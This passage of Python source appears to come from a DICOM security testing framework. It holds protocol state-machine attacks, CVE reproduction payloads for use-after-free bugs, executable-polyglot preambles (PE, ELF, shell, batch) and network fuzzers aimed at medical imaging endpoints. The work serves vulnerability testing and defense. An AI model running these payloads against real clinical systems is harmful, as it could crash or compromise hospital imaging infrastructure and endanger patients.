            cmd = C_ECHO_RQ(message_id=1)
            pdv = PresentationDataValueItem(
                presentation_context_id=1,
                message_control_header=0x03,
                data=raw(cmd),
            )
            pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
        
        try:
            sock = self._connect()
            sock.sendall(assoc_pdu)
            self._recv(sock)
            sock.sendall(release_pdu)
            sock.sendall(pdata_pdu)
            response = self._recv(sock)
            sock.close()
            
            return AttackResult(
                name='release_then_pdata',
                category='state_machine',
                payload=pdata_pdu,
                description='P-DATA-TF after A-RELEASE-RQ',
                expected_behavior='Target should abort',
                response=response,
                success=True,
            )
        except Exception as e:
            return AttackResult(
                name='release_then_pdata',
                category='state_machine',
                payload=b'',
                description=f'Failed: {e}',
                expected_behavior='N/A',
                success=False,
            )
    
    def incomplete_fragment(self) -> AttackResult:
        """Send partial data marked as 'not last', then close."""
        assoc_pdu, _ = ProtocolAttacks.double_association()
        
        try:
            sock = self._connect()
            sock.sendall(assoc_pdu)
            resp = self._recv(sock)
            
            # Check if accepted (type 0x02)
            if not resp or resp[0] != 0x02:
                sock.close()
                return AttackResult(
                    name='incomplete_fragment',
                    category='state_machine',
                    payload=b'',
                    description='Association rejected',
                    expected_behavior='N/A',
                    success=False,
                )
            
            # Send partial P-DATA with is_last=0
            if SCAPY_AVAILABLE:
                pdv = PresentationDataValueItem(
                    presentation_context_id=1,
                    message_control_header=0x00,  # Not last, not command
                    data=b'partial data here',
                )
                pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
            else:
                pdata = b'\x04\x00' + struct.pack('!I', 24) + b'\x00\x00\x00\x14\x01\x00' + b'partial data here'
            
            sock.sendall(pdata)
            # Close without completing
            sock.close()
            
            return AttackResult(
                name='incomplete_fragment',
                category='state_machine',
                payload=pdata,
                description='Partial P-DATA-TF then close',
                expected_behavior='Target should handle incomplete transfer',
                success=True,
            )
        except Exception as e:
            return AttackResult(
                name='incomplete_fragment',
                category='state_machine',
                payload=b'',
                description=f'Failed: {e}',
                expected_behavior='N/A',
                success=False,
            )


# =============================================================================
# CVE Attacks - CVE-specific reproductions
# =============================================================================

class CVEAttacks:
    """
    CVE-specific test cases organized by CVE number.
    
    Each method generates one or more AttackResult objects that reproduce
    the conditions described in the CVE.
    """
    
    # -------------------------------------------------------------------------
    # CVE-2023-32135: Use-After-Free in DCM File Parsing
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2023_32135_sequence_uaf() -> List[AttackResult]:
        """
        CVE-2023-32135: Use-After-Free in DCM File Parsing
        
        The parser attempts to access DICOM elements after referenced
        memory has been freed. Tests sequence pointer attacks.
        """
        results = []
        
        # Test 1: Omit critical sequence tags
        data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data tag
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)  # Undefined length
        # No sequence items - reference will dangle
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2023_32135_01_missing_sequence_items',
            category='cve',
            payload=data,
            description='Sequence with undefined length but no items',
            expected_behavior='Parser may access freed sequence memory',
            metadata={'cve': 'CVE-2023-32135'}
        ))
        
        # Test 2: Invalid nested dataset pointers (beyond EOF)
        data = struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item
        data += struct.pack('<I', 0x7FFFFFFF)  # Points way beyond EOF
        # No actual item data
        
        results.append(AttackResult(
            name='cve_2023_32135_02_invalid_nested_pointer',
            category='cve',
            payload=data,
            description='Sequence item with offset beyond EOF',
            expected_behavior='Parser should detect invalid offset',
            metadata={'cve': 'CVE-2023-32135'}
        ))
        
        # Test 3: Premature sequence termination (truncated file)
        data = struct.pack('<HH', 0x0040, 0xA730)  # Content Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item start
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0x0008, 0x0100)  # Some element
        # Truncate here - no delimiters
        
        results.append(AttackResult(
            name='cve_2023_32135_03_premature_termination',
            category='cve',
            payload=data,
            description='Sequence truncated without delimiters',
            expected_behavior='Parser may leave dangling references',
            metadata={'cve': 'CVE-2023-32135'}
        ))
        
        return results
    
    # -------------------------------------------------------------------------
    # CVE-2024-24793: Use-After-Free in File Meta Information
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2024_24793_duplicate_meta_tags() -> List[AttackResult]:
        """
        CVE-2024-24793: Use-After-Free in File Meta Information
        
        When inserting duplicate tags into File Meta Information header,
        the element is freed but still referenced.
        """
        results = []
        
        # Test 1: Duplicate Transfer Syntax UID
        meta = b'\x00' * 128 + b'DICM'
        # First Transfer Syntax
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'UI'
        meta += struct.pack('<H', 18)
        meta += b'1.2.840.10008.1.2\x00'
        # DUPLICATE Transfer Syntax
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'UI'
        meta += struct.pack('<H', 20)
        meta += b'1.2.840.10008.1.2.1\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_01_duplicate_transfer_syntax',
            category='cve',
            payload=meta,
            description='Two Transfer Syntax UID elements in meta header',
            expected_behavior='Parser may UAF on duplicate insertion',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        # Test 2: Duplicate Media Storage SOP Class
        meta = b'\x00' * 128 + b'DICM'
        meta += struct.pack('<HH', 0x0002, 0x0002)
        meta += b'UI'
        meta += struct.pack('<H', 26)
        meta += b'1.2.840.10008.5.1.4.1.1.2\x00'
        meta += struct.pack('<HH', 0x0002, 0x0002)  # DUPLICATE
        meta += b'UI'
        meta += struct.pack('<H', 26)
        meta += b'1.2.840.10008.5.1.4.1.1.4\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_02_duplicate_sop_class',
            category='cve',
            payload=meta,
            description='Two Media Storage SOP Class elements',
            expected_behavior='Parser may UAF on duplicate',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        # Test 3: Duplicate with different VRs
        meta = b'\x00' * 128 + b'DICM'
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'UI'
        meta += struct.pack('<H', 18)
        meta += b'1.2.840.10008.1.2\x00'
        meta += struct.pack('<HH', 0x0002, 0x0010)
        meta += b'LO'  # Different VR!
        meta += struct.pack('<H', 20)
        meta += b'1.2.840.10008.1.2.1\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_03_duplicate_different_vr',
            category='cve',
            payload=meta,
            description='Duplicate tag with conflicting VRs',
            expected_behavior='Parser confusion on VR',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        # Test 4: Rapid duplicate sequence (many duplicates)
        meta = b'\x00' * 128 + b'DICM'
        for i in range(10):
            meta += struct.pack('<HH', 0x0002, 0x0010)
            meta += b'UI'
            meta += struct.pack('<H', 18)
            meta += b'1.2.840.10008.1.2\x00'
        
        results.append(AttackResult(
            name='cve_2024_24793_04_rapid_duplicates',
            category='cve',
            payload=meta,
            description='10 consecutive duplicate Transfer Syntax tags',
            expected_behavior='Multiple UAF opportunities',
            metadata={'cve': 'CVE-2024-24793'}
        ))
        
        return results
    
    # -------------------------------------------------------------------------
    # CVE-2024-24794: Use-After-Free in Sequence Value Representation
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2024_24794_sequence_duplicates() -> List[AttackResult]:
        """
        CVE-2024-24794: Use-After-Free in Sequence parsing
        
        Similar to CVE-2024-24793 but occurs in nested sequence parsing.
        """
        results = []
        
        # Test 1: Duplicate tags in nested sequence
        data = struct.pack('<HH', 0x0008, 0x1115)  # Referenced Series Sequence
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)  # Item
        data += struct.pack('<I', 0xFFFFFFFF)
        # First element
        data += struct.pack('<HH', 0x0008, 0x1150)
        data += b'UI'
        data += struct.pack('<H', 10)
        data += b'1.2.3.4.5\x00'
        # DUPLICATE element
        data += struct.pack('<HH', 0x0008, 0x1150)
        data += b'UI'
        data += struct.pack('<H', 12)
        data += b'1.2.3.4.5.6\x00'
        data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_01_duplicate_in_sequence',
            category='cve',
            payload=data,
            description='Duplicate tag within sequence item',
            expected_behavior='Parser may UAF in sequence context',
            metadata={'cve': 'CVE-2024-24794'}
        ))
        
        # Test 2: Duplicate sequence delimiters
        data = struct.pack('<HH', 0x0008, 0x1115)
        data += b'SQ'
        data += b'\x00\x00'
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE000)
        data += struct.pack('<I', 0xFFFFFFFF)
        data += struct.pack('<HH', 0xFFFE, 0xE00D)  # Item delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # Sequence delim
        data += struct.pack('<I', 0)
        data += struct.pack('<HH', 0xFFFE, 0xE0DD)  # DUPLICATE delim
        data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_02_duplicate_delimiters',
            category='cve',
            payload=data,
            description='Multiple sequence delimitation items',
            expected_behavior='Parser may process freed delimiter',
            metadata={'cve': 'CVE-2024-24794'}
        ))
        
        # Test 3: Deeply nested duplicates (5 levels)
        data = b''
        for level in range(5):
            data += struct.pack('<HH', 0x0040, 0xA730)
            data += b'SQ'
            data += b'\x00\x00'
            data += struct.pack('<I', 0xFFFFFFFF)
            data += struct.pack('<HH', 0xFFFE, 0xE000)
            data += struct.pack('<I', 0xFFFFFFFF)
            # Duplicate at each level
            data += struct.pack('<HH', 0x0008, 0x0100)
            data += b'SH'
            data += struct.pack('<H', 4)
            data += b'ABC\x00'
            data += struct.pack('<HH', 0x0008, 0x0100)  # DUPLICATE
            data += b'SH'
            data += struct.pack('<H', 4)
            data += b'XYZ\x00'
        
        # Close all levels
        for level in range(5):
            data += struct.pack('<HH', 0xFFFE, 0xE00D)
            data += struct.pack('<I', 0)
            data += struct.pack('<HH', 0xFFFE, 0xE0DD)
            data += struct.pack('<I', 0)
        
        results.append(AttackResult(
            name='cve_2024_24794_03_deeply_nested_duplicates',
            category='cve',
            payload=data,
            description='5 levels of nesting with duplicates at each',
            expected_behavior='UAF at multiple nesting levels',
            metadata={'cve': 'CVE-2024-24794'}
        ))
        
        return results
    
    # -------------------------------------------------------------------------
    # CVE-2019-11687: Executable Embedding (PEDICOM/ELFDICOM)
    # -------------------------------------------------------------------------
    
    @staticmethod
    def cve_2019_11687_polyglot() -> List[AttackResult]:
        """
        CVE-2019-11687: Executable Embedding in DICOM Preamble
        
        The 128-byte preamble can contain PE/ELF headers, making the file
        valid as both DICOM and executable.
        """
        results = []
        
        # Test 1: Minimal PE header in preamble
        # DOS Header
        dos_header = b'MZ' + b'\x00' * 58  # MZ signature + padding
        dos_header += struct.pack('<I', 0x80)  # e_lfanew points to offset 128 (after preamble)
        dos_header += b'\x00' * (64 - len(dos_header))  # Pad DOS header to 64 bytes
        dos_header += b'\x00' * 64  # Rest of preamble
        
        file_data = dos_header + b'DICM'
        # Add minimal dataset
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_01_pe_header',
            category='cve',
            payload=file_data,
            description='DOS/PE header in DICOM preamble (PEDICOM)',
            expected_behavior='Scanner should detect PE signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE'}
        ))
        
        # Test 2: ELF header in preamble
        elf_header = b'\x7FELF'  # ELF magic
        elf_header += b'\x02'  # 64-bit
        elf_header += b'\x01'  # Little endian
        elf_header += b'\x01'  # ELF version
        elf_header += b'\x00' * (128 - len(elf_header))  # Pad
        
        file_data = elf_header + b'DICM'
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_02_elf_header',
            category='cve',
            payload=file_data,
            description='ELF header in DICOM preamble (ELFDICOM)',
            expected_behavior='Scanner should detect ELF signature',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF'}
        ))
        
        # Test 3: Shell script in preamble
        script = b'#!/bin/sh\necho "pwned"\n#'
        script += b'\x00' * (128 - len(script))
        
        file_data = script + b'DICM'
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_03_script_preamble',
            category='cve',
            payload=file_data,
            description='Shell script in DICOM preamble',
            expected_behavior='Scanner should detect script',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'shell'}
        ))
        
        # Test 4: Batch script in preamble
        batch = b'@echo off\r\necho pwned\r\nREM '
        batch += b' ' * (128 - len(batch))
        
        file_data = batch + b'DICM'
        file_data += struct.pack('<HH', 0x0008, 0x0016) + b'UI' + struct.pack('<H', 26)
        file_data += b'1.2.840.10008.5.1.4.1.1.7\x00'
        
        results.append(AttackResult(
            name='cve_2019_11687_04_batch_preamble',
            category='cve',
            payload=file_data,
            description='Batch script in DICOM preamble',
            expected_behavior='Scanner should detect batch script',
            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'batch'}
        ))
        
        return results


# =============================================================================
# Protocol Fuzzer - Interactive fuzzing infrastructure
# =============================================================================

class ProtocolFuzzer:
    """
    Interactive protocol fuzzer for DICOM endpoints.
    
    Example:
        fuzzer = ProtocolFuzzer(('192.168.1.100', 11112))
        
        for result in fuzzer.fuzz_association(count=100):
            if result.interesting:
                print(f"Interesting: {result.mutation}")
    """
    
    def __init__(self, target: Tuple[str, int], timeout: float = 5.0):
        """Initialize fuzzer with target."""
        self.target = target
        self.timeout = timeout
    
    def _connect(self) -> socket.socket:
        """Create connected socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect(self.target)
        return sock
    
    def _recv(self, sock: socket.socket) -> Optional[bytes]:
        """Receive with timeout."""
        try:
            return sock.recv(65536)
        except socket.timeout:
            return None
    
    def fuzz_association(self, count: int = 100) -> Generator[AttackResult, None, None]:
        """
        Fuzz A-ASSOCIATE-RQ using various mutations.
        """
        for i in range(count):
            try:
                if SCAPY_AVAILABLE:
                    # Use Scapy's fuzz()
                    pkt = fuzz(DICOM() / A_ASSOCIATE_RQ())
                    pdu_bytes = raw(pkt)
                    mutation = 'scapy_fuzz'
                else:
                    # Manual fuzzing
                    pdu_bytes = ProtocolAttacks.malformed_protocol_version(
                        random.randint(0, 0xFFFF)
                    )
                    mutation = 'protocol_version'
                
                sock = self._connect()
                sock.sendall(pdu_bytes)
                response = self._recv(sock)
                sock.close()
                
                # Determine if interesting
                interesting = (
                    response is None or
                    len(response) == 0 or
                    (response and response[0] not in (0x02, 0x03, 0x07))
                )
                
                yield AttackResult(
                    name=f'fuzz_assoc_{i}',
                    category='fuzzer',
                    payload=pdu_bytes,
                    description=f'Fuzzed A-ASSOCIATE-RQ #{i}',
                    expected_behavior='Target should handle gracefully',
                    response=response,
                    success=True,
                    metadata={'mutation': mutation, 'interesting': interesting}
                )
                
            except Exception as e:
                yield AttackResult(
                    name=f'fuzz_assoc_{i}',
                    category='fuzzer',
                    payload=b'',
                    description=f'Exception: {e}',
                    expected_behavior='N/A',
                    success=False,
                    metadata={'error': str(e), 'interesting': True}
                )
    
    def fuzz_cstore(self, sop_class_uid: str = None, 
                    count: int = 100) -> Generator[AttackResult, None, None]:
        """
        Fuzz C-STORE-RQ using various mutations.
        """
        sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID
        
        for i in range(count):
            try:
                if not SCAPY_AVAILABLE:
                    yield AttackResult(
                        name=f'fuzz_cstore_{i}',
                        category='fuzzer',
                        payload=b'',
                        description='Scapy not available',
                        expected_behavior='N/A',
                        success=False,
                    )
                    continue
                
                # Fuzz different aspects
                if i % 5 == 0:
                    # Fuzz group_length
                    cmd = C_STORE_RQ(
                        command_group_length=random.choice([0, 10, 0xFFFF, 0xFFFFFFFF]),
                        affected_sop_class_uid=_uid_to_bytes(sop_class),
                        affected_sop_instance_uid=f'1.2.3.{i}'.encode(),
                        message_id=random.randint(1, 65535),
                    )
                    mutation = 'group_length'
                elif i % 5 == 1:
                    # Odd-length UIDs
                    cmd = C_STORE_RQ(
                        command_group_length=100,
                        affected_sop_class_uid=b'1.2.3.4.5',  # 9 bytes - odd
                        affected_sop_instance_uid=b'1.2.3.4.5.6.7',  # 13 bytes - odd
                        message_id=1,
                    )
                    mutation = 'odd_length_uid'
                elif i % 5 == 2:
                    # Invalid command field
                    cmd = C_STORE_RQ(
                        affected_sop_class_uid=sop_class,
                        affected_sop_instance_uid=f'1.2.3.{i}',
                        message_id=1,
                    )
                    cmd.command_field = 0xDEAD
                    mutation = 'invalid_command'
                else:
                    # Scapy fuzz()
                    cmd = fuzz(C_STORE_RQ())
                    cmd.affected_sop_class_uid = sop_class
                    cmd.affected_sop_instance_uid = f'1.2.3.{i}'
                    mutation = 'scapy_fuzz'
                
                yield AttackResult(
                    name=f'fuzz_cstore_{i}',
                    category='fuzzer',
                    payload=raw(cmd),
                    description=f'Fuzzed C-STORE-RQ #{i}',
                    expected_behavior='Target should handle gracefully',
                    success=True,
                    metadata={'mutation': mutation}
                )
                
            except Exception as e:
                yield AttackResult(
                    name=f'fuzz_cstore_{i}',
                    category='fuzzer',
                    payload=b'',
                    description=f'Exception: {e}',
                    expected_behavior='N/A',
                    success=False,
                    metadata={'error': str(e)}
                )


# =============================================================================
# Targeted Fuzzer - Pydicom-aware fuzzing
# =============================================================================

class TargetedFuzzer:
    """
    Targeted fuzzer that uses pydicom to understand structure,
    then applies intelligent corruptions.
    """
    
    def __init__(self, pydicom_dataset):
        """Initialize with pydicom dataset."""
        self.source = pydicom_dataset
        self.corruptor = Corruptor(pydicom_dataset)
    
    def target_vr_parser(self, vr: str) -> Generator[AttackResult, None, None]:
        """Generate attacks targeting specific VR parser."""
        invalid_vrs = ['XX', '\x00\x00', 'ZZ', '!!', '  ']
        
        for tag in self.source.keys():
            elem = self.source[tag]
            if hasattr(elem, 'VR') and elem.VR == vr:
                for invalid_vr in invalid_vrs:
                    c = Corruptor(self.source)
                    c.set_vr(tag, invalid_vr)
                    
                    yield AttackResult(
                        name=f'vr_fuzz_{tag}_{invalid_vr}',
                        category='targeted',
                        payload=c.to_bytes(),
                        description=f'Tag {tag} VR changed from {vr} to {invalid_vr}',
                        expected_behavior='Parser should handle gracefully',
                        metadata={'tag': tag, 'original_vr': vr, 'fuzzed_vr': invalid_vr}
                    )
    
    def target_length_handling(self) -> Generator[AttackResult, None, None]:
        """Generate length-based attacks on each element."""
        lengths = [0, 1, 0xFFFF, 0xFFFFFFFF]
        
        for tag in self.source.keys():
            for length in lengths:
                c = Corruptor(self.source)
                c.set_length(tag, length)
                
                yield AttackResult(
                    name=f'length_fuzz_{tag}_{length:#x}',
                    category='targeted',
                    payload=c.to_bytes(),
                    description=f'Tag {tag} length set to {length:#x}',
                    expected_behavior='Parser should detect length issues',
                    metadata={'tag': tag, 'fuzzed_length': length}
                )
    
    def target_pixel_data(self) -> Generator[AttackResult, None, None]:
        """Generate pixel data attacks if present."""
        if (0x7FE0, 0x0010) not in self.source:
            return
        
        # Corrupt dimensions
        for val in [0, 1, 0xFFFF]:
            c = Corruptor(self.source)
            if (0x0028, 0x0010) in self.source:
                c.override((0x0028, 0x0010), struct.pack('<H', val))
            
            yield AttackResult(
                name=f'pixel_rows_{val}',
                category='targeted',
                payload=c.to_bytes(),
                description=f'Rows set to {val}',
                expected_behavior='Parser should validate dimensions',
                metadata={'rows': val}
            )


# =============================================================================
# Combined Attacks - Dataset + Protocol together
# =============================================================================

class CombinedAttacks:
    """
    Combined attacks that fuzz BOTH dataset AND protocol.
    """
    
    @staticmethod
    def corrupt_store(target: Tuple[str, int],
                      dataset_attack: AttackResult,
                      sop_class_uid: str = None,
                      sop_instance_uid: str = '1.2.3.4.5') -> AttackResult:
        """
        C-STORE with corrupted dataset.
        """
        if not SCAPY_AVAILABLE:
            return AttackResult(
                name='corrupt_store',
                category='combined',
                payload=dataset_attack.payload,
                description='Scapy not available',
                expected_behavior='N/A',
                success=False,
            )
        
        sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID
        
        try:
            with DICOMSocket(target[0], target[1], 'TARGET', 'ATTACKER') as sock:
                if not sock.associate({
                    sop_class: [DEFAULT_TRANSFER_SYNTAX_UID]
                }):
                    return AttackResult(
                        name='corrupt_store',
                        category='combined',
                        payload=dataset_attack.payload,
                        description='Association rejected',
                        expected_behavior='N/A',
                        success=False,
                    )
                
                status = sock.c_store(
                    dataset_attack.payload,
                    sop_class,
                    sop_instance_uid,
                    DEFAULT_TRANSFER_SYNTAX_UID,
                )
                
                return AttackResult(
                    name='corrupt_store',
                    category='combined',
                    payload=dataset_attack.payload,
                    description=f'C-STORE with {dataset_attack.name}',
                    expected_behavior='Target should reject corrupt dataset',
                    metadata={'inner_attack': dataset_attack.name, 'status': status},
                    success=True,
                )
                
        except Exception as e:
            return AttackResult(
                name='corrupt_store',
                category='combined',
                payload=dataset_attack.payload,
                description=f'Failed: {e}',
                expected_behavior='N/A',
                success=False,
            )
    
    @staticmethod
    def zero_length_dataset(target: Tuple[str, int]) -> AttackResult:
        """C-STORE with empty dataset."""
        return CombinedAttacks.corrupt_store(
            target,
            AttackResult(
                name='zero_length',
                category='combined',
                payload=b'',
                description='Empty dataset',
                expected_behavior='Should reject',
            ),
        )
    
    @staticmethod
    def bitflip_corruption(target: Tuple[str, int], 
                          dataset: bytes, 
                          flip_count: int = 10) -> AttackResult:
        """C-STORE with random bit flips."""
        corrupted = bytearray(dataset)
        for _ in range(min(flip_count, len(corrupted))):
            idx = random.randint(0, len(corrupted) - 1)
            corrupted[idx] ^= random.randint(1, 255)
        
        return CombinedAttacks.corrupt_store(
            target,
            AttackResult(
                name='bitflip',
                category='combined',
                payload=bytes(corrupted),
                description=f'{flip_count} random bit flips',
                expected_behavior='Should handle gracefully',
            ),
        )
